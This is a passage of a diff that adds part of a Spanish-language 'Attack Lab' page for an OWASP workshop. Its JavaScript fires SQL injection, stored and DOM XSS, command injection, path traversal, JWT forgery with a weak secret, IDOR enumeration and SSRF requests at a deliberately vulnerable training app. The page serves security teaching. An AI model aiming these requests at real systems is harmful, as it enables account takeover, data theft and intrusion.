+        </div>
+        <button class="btn" onclick="attackSSRF()">&#x1F310; Fetch (server-side)</button>
+        <div class="result" id="ssrf-result"></div>
+      </div>
+
+      <div class="fix">Validar URL contra una allowlist de dominios. Bloquear protocolos no-HTTP. Bloquear rangos de IP internos (127.0.0.0/8, 169.254.0.0/16, 10.0.0.0/8).</div>
+    </section>
+  </main>
+
+  <footer>
+    &#x1F3F4;&#x200D;&#x2620;&#xFE0F; Attack Lab &#x2014; Taller de Seguridad Web OWASP &#xB7; Solo para uso educativo
+    &#xB7; <a href="/">&#x2190; Volver a VulnMotors</a>
+  </footer>
+
+  <script>
+    let TARGET = localStorage.getItem('attacklab-target') || window.location.origin;
+    document.getElementById('target-url').value = TARGET;
+
+    function updateTarget() {
+      TARGET = document.getElementById('target-url').value.replace(/\/$/, '');
+      localStorage.setItem('attacklab-target', TARGET);
+      document.getElementById('csrf-form').action = TARGET + '/session/transfer';
+    }
+    updateTarget();
+
+    // Tab navigation
+    function showTab(name) {
+      document.querySelectorAll('.attack-section').forEach(function(s) { s.classList.remove('active'); });
+      document.querySelectorAll('#nav-tabs button').forEach(function(b) { b.classList.remove('active'); });
+      document.getElementById('tab-' + name).classList.add('active');
+      if (event && event.target) {
+        var btn = event.target.closest('button');
+        if (btn) btn.classList.add('active');
+      }
+    }
+
+    // Helper: make request and show result
+    async function req(url, options) {
+      options = options || {};
+      try {
+        var r = await fetch(url, Object.assign({ credentials: 'include' }, options));
+        var ct = r.headers.get('content-type') || '';
+        var body;
+        if (ct.indexOf('json') !== -1) {
+          body = JSON.stringify(await r.json(), null, 2);
+        } else {
+          body = await r.text();
+        }
+        return { status: r.status, headers: Object.fromEntries(r.headers.entries()), body: body, ok: r.ok };
+      } catch (e) {
+        return { status: 0, body: 'Error: ' + e.message, ok: false, headers: {} };
+      }
+    }
+
+    function showResult(elId, data) {
+      var el = document.getElementById(elId);
+      el.textContent = '[' + data.status + '] ' + data.body;
+      el.className = data.ok ? 'result' : 'result error';
+    }
+
+    // SQLi
+    function setSQLi(user, pass) {
+      document.getElementById('sqli-user').value = user;
+      document.getElementById('sqli-pass').value = pass;
+    }
+
+    async function attackSQLi() {
+      var username = document.getElementById('sqli-user').value;
+      var password = document.getElementById('sqli-pass').value;
+      var data = await req(TARGET + '/auth/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username: username, password: password })
+      });
+      showResult('sqli-result', data);
+      try {
+        var parsed = JSON.parse(data.body);
+        if (parsed.token) {
+          document.getElementById('jwt-token').value = parsed.token;
+        }
+      } catch (e) {}
+    }
+
+    // XSS
+    function setXSS(payload) {
+      document.getElementById('xss-payload').value = payload;
+    }
+
+    async function attackXSSStored() {
+      var content = document.getElementById('xss-payload').value;
+      var data = await req(TARGET + '/comments', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ user_id: 1, content: content })
+      });
+      var el = document.getElementById('xss-result');
+      if (data.ok) {
+        el.textContent = 'Comentario inyectado. Visita la seccion de comentarios en VulnMotors para ver el XSS ejecutarse.\n\nPayload: ' + content;
+        el.className = 'result';
+      } else {
+        showResult('xss-result', data);
+      }
+    }
+
+    function setDOMXSS(payload) {
+      document.getElementById('domxss-payload').value = payload;
+    }
+
+    function attackDOMXSS() {
+      var payload = document.getElementById('domxss-payload').value;
+      var url = TARGET + '/?msg=' + encodeURIComponent(payload);
+      window.open(url, '_blank');
+    }
+
+    function copyDOMXSSLink() {
+      var payload = document.getElementById('domxss-payload').value;
+      var url = TARGET + '/?msg=' + encodeURIComponent(payload);
+      navigator.clipboard.writeText(url);
+      var btn = event.target;
+      var orig = btn.textContent;
+      btn.textContent = 'Copiado!';
+      btn.classList.add('copied');
+      setTimeout(function() { btn.textContent = orig; btn.classList.remove('copied'); }, 1500);
+    }
+
+    // CMDi
+    function setCMD(cmd) {
+      document.getElementById('cmdi-cmd').value = cmd;
+    }
+
+    async function attackCMDi() {
+      var cmd = document.getElementById('cmdi-cmd').value;
+      var data = await req(TARGET + '/debug?cmd=' + encodeURIComponent(cmd));
+      showResult('cmdi-result', data);
+    }
+
+    // Path Traversal
+    function setPath(p) {
+      document.getElementById('path-input').value = p;
+    }
+
+    async function attackPath() {
+      var p = document.getElementById('path-input').value;
+      var data = await req(TARGET + '/files?path=' + encodeURIComponent(p));
+      showResult('path-result', data);
+    }
+
+    async function listFiles() {
+      var data = await req(TARGET + '/files');
+      showResult('path-result', data);
+    }
+
+    // JWT
+    function decodeJWT() {
+      var token = document.getElementById('jwt-token').value.trim();
+      if (!token) { document.getElementById('jwt-decode-result').textContent = 'Pega un token primero'; return; }
+      try {
+        var parts = token.split('.');
+        var header = JSON.parse(atob(parts[0]));
+        var payload = JSON.parse(atob(parts[1]));
+        document.getElementById('jwt-decode-result').textContent =
+          'Header:\n' + JSON.stringify(header, null, 2) + '\n\nPayload:\n' + JSON.stringify(payload, null, 2) +
+          '\n\nSignature: ' + parts[2] +
+          '\n\nSi el secreto es "secret", puedes forjar cualquier payload!';
+        document.getElementById('jwt-decode-result').className = 'result';
+      } catch (e) {
+        document.getElementById('jwt-decode-result').textContent = 'Error decodificando: ' + e.message;
+        document.getElementById('jwt-decode-result').className = 'result error';
+      }
+    }
+
+    async function getToken() {
+      var data = await req(TARGET + '/auth/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username: 'alice', password: 'password123' })
+      });
+      try {
+        var parsed = JSON.parse(data.body);
+        if (parsed.token) {
+          document.getElementById('jwt-token').value = parsed.token;
+          decodeJWT();
+        } else {
+          showResult('jwt-decode-result', data);
+        }
+      } catch (e) {
+        showResult('jwt-decode-result', data);
+      }
+    }
+
+    async function forgeJWT() {
+      var header = btoa(JSON.stringify({ alg: 'HS256', typ: 'JWT' })).replace(/=/g, '');
+      var payload = btoa(JSON.stringify({
+        userId: parseInt(document.getElementById('jwt-forge-id').value),
+        username: document.getElementById('jwt-forge-user').value,
+        role: document.getElementById('jwt-forge-role').value,
+        iat: Math.floor(Date.now() / 1000),
+        exp: Math.floor(Date.now() / 1000) + 86400
+      })).replace(/=/g, '');
+
+      var el = document.getElementById('jwt-forge-result');
+      el.textContent = 'Para firmar necesitas HMAC-SHA256 con secreto "secret".\n\nHeader (base64): ' + header + '\nPayload (base64): ' + payload + '\n\nUsa una de estas herramientas:\n  -> https://jwt.io (pega el secreto "secret" en el campo)\n  -> python3 -c "import jwt; print(jwt.encode({...}, \'secret\', algorithm=\'HS256\'))"\n  -> Node.js: require(\'jsonwebtoken\').sign({userId:999,username:\'hacker\',role:\'admin\'},\'secret\')';
+      el.className = 'result';
+    }
+
+    async function testForgedToken() {
+      var token = document.getElementById('jwt-token').value.trim();
+      if (!token) { document.getElementById('jwt-forge-result').textContent = 'Primero obten o forja un token'; return; }
+      var data = await req(TARGET + '/users/1', {
+        headers: { 'Authorization': 'Bearer ' + token }
+      });
+      showResult('jwt-forge-result', data);
+    }
+
+    // IDOR
+    async function attackIDOR() {
+      var start = parseInt(document.getElementById('idor-start').value);
+      var end = parseInt(document.getElementById('idor-end').value);
+      var el = document.getElementById('idor-result');
+      el.textContent = 'Enumerando...\n';
+
+      // Login as bob
+      var loginResp = await req(TARGET + '/auth/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username: 'bob', password: 'qwerty' })
+      });
+      var authToken = '';
+      try { authToken = JSON.parse(loginResp.body).token; } catch (e) {}
+
+      for (var i = start; i <= end; i++) {
+        var data = await req(TARGET + '/users/' + i, {
+          headers: authToken ? { 'Authorization': 'Bearer ' + authToken } : {}
+        });
+        if (data.ok) {
+          try {
+            var user = JSON.parse(data.body);
+            el.textContent += 'ID ' + i + ': ' + user.username + ' (' + user.role + ') -- ' + (user.email || 'sin email') + '\n';
+          } catch (e) {
+            el.textContent += 'ID ' + i + ': ' + data.body + '\n';
+          }
+        } else {
+          el.textContent += 'ID ' + i + ': [' + data.status + '] ' + data.body + '\n';
+        }
+      }
+      el.textContent += '\nEnumeracion completada. Bob puede ver datos de alice y carol.';
+      el.className = 'result';
+    }
+
+    async function attackIDOREdit() {
+      var loginResp = await req(TARGET + '/auth/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username: 'bob', password: 'qwerty' })
+      });
+      var bobToken = '';
+      try { bobToken = JSON.parse(loginResp.body).token; } catch (e) {}
+      if (!bobToken) { document.getElementById('idor-edit-result').textContent = 'No se pudo obtener token de bob'; return; }
+
+      var carId = document.getElementById('idor-car-id').value;
+      var data = await req(TARGET + '/products/' + carId, {
+        method: 'PUT',
+        headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + bobToken },
+        body: JSON.stringify({ name: document.getElementById('idor-car-name').value })
+      });
+      showResult('idor-edit-result', data);
+    }
+
+    // Cookies
+    async function cookieLogin() {
+      var username = document.getElementById('cookie-user').value;
+      var password = document.getElementById('cookie-pass').value;
+      var data = await req(TARGET + '/session/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username: username, password: password })
+      });
+      var el = document.getElementById('cookie-result');
+      if (data.ok) {
+        el.textContent = 'Cookie establecida!\n\n' + data.body +
+          '\n\n-> Abre DevTools -> Application -> Cookies para inspeccionar las flags.\n' +
+          '-> Si NO ves HttpOnly/Secure/SameSite, la cookie es INSEGURA.';
+        el.className = 'result';
+      } else {
+        showResult('cookie-result', data);
+      }
+    }
+
+    async function checkCookie() {
+      var data = await req(TARGET + '/session/me');
+      showResult('cookie-result', data);
+    }
+
+    function readDocCookie() {
+      var el = document.getElementById('cookie-result');
+      var cookies = document.cookie;
+      if (cookies) {
+        el.textContent = 'document.cookie accesible:\n\n' + cookies +
+          '\n\nUn atacante con XSS podria robar esta cookie!\n' +
+          'Si tuviera HttpOnly, este campo estaria vacio.';
+        el.className = 'result error';
+      } else {
+        el.textContent = 'document.cookie esta vacio.\n\n' +
+          'Posibilidades:\n  1. No hay cookie de sesion activa (haz login primero)\n' +
+          '  2. La cookie tiene HttpOnly (JS no puede acceder)\n' +
+          '  3. La cookie es de otro dominio (SameSite)';
+        el.className = 'result';
+      }
+    }
+
+    // Secrets
+    async function attackSecrets() {
+      var data = await req(TARGET + '/debug');
+      showResult('secrets-result', data);
+    }
+
+    async function testPlaintext() {
+      var user = document.getElementById('secrets-reg-user').value;
+      var pass = document.getElementById('secrets-reg-pass').value;
+
+      await req(TARGET + '/auth/register', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username: user, password: pass, email: user + '@test.com' })
+      });
+
+      var loginData = await req(TARGET + '/auth/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username: user, password: pass })
+      });
+
+      var el = document.getElementById('plaintext-result');
+      if (loginData.ok) {
+        el.textContent = 'Login exitoso con password en texto plano.\n\n' +
+          'Si el password se almacenara hasheado (bcrypt/argon2),\n' +
+          'la comparacion directa en SQL no funcionaria.\n\n' +
+          'Comprueba en /debug si ves las credenciales en claro.';
+        el.className = 'result';
+      } else {
+        showResult('plaintext-result', loginData);
+      }
+    }
+
+    // Headers
+    async function checkHeaders() {
+      var data = await req(TARGET + '/api');
+      var el = document.getElementById('headers-result');
+      var secHeaders = ['content-security-policy', 'strict-transport-security', 'x-frame-options', 'x-content-type-options', 'referrer-policy', 'permissions-policy'];
+      var result = 'Cabeceras de respuesta:\n\n';
+
+      for (var k in data.headers) {
+        result += '  ' + k + ': ' + data.headers[k] + '\n';
+      }
+
+      result += '\n--- Auditoria de seguridad ---\n\n';
+      var missing = 0;
+      for (var i = 0; i < secHeaders.length; i++) {
+        var h = secHeaders[i];
+        var present = data.headers[h];
+        if (present) {
+          result += '  [OK] ' + h + ': ' + present + '\n';
+        } else {
+          result += '  [FALTA] ' + h + '\n';
+          missing++;
+        }
+      }
+      result += '\n' + (missing === 0 ? 'Todas las cabeceras presentes!' : missing + ' cabeceras de seguridad faltan.');
+      el.textContent = result;
+      el.className = missing > 0 ? 'result error' : 'result';
+    }
+
+    function testClickjack() {
+      document.getElementById('clickjack-frame').src = TARGET + '/';
+    }
+
+    // SSRF
+    function setSSRF(url) {
+      document.getElementById('ssrf-url').value = url;
+    }
+
+    async function attackSSRF() {
+      var url = document.getElementById('ssrf-url').value;
+      var data = await req(TARGET + '/fetch-image?url=' + encodeURIComponent(url));
+      showResult('ssrf-result', data);
+    }
+
+    // Init
+    var storedToken = localStorage.getItem('token');
+    if (storedToken) {
+      document.getElementById('jwt-token').value = storedToken;
+    }
+  </script>
+</body>
+</html>
